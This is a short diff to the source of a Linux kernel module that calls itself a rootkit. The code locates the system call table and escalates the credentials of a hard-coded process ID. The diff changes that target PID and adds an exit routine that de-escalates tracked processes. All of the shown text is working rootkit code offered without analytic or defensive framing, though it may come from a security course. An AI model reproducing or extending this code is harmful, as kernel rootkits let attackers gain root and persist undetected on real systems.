@@ -103,6 +103,7 @@ void process_escalate(pid_t pid){
 }
 
 void process_deescalate(pid_t pid){
+  printk("process_deescalate()");
   struct task_struct *task;
   PID_NODE *node = find_pid_node(&head, pid);
   struct cred *pcred;
@@ -180,11 +181,18 @@ int rootkit_init(void) {
   if (retval == EFAULT)
     return retval;
   printk("We found the sys call table at %p\n", sys_call_table_addr);
-  process_escalate(27614);
+  process_escalate(31151);
   return 0;
 }
 
 void rootkit_exit(void) {
   printk("rootkit_exit() invoked. Goodbye!\n");
   /*need to clean up the LL*/
+  PID_NODE *node = head;
+
+  while(node != NULL) {
+    process_deescalate(node->pid);
+    node = head;
+  }
+  return;
 }
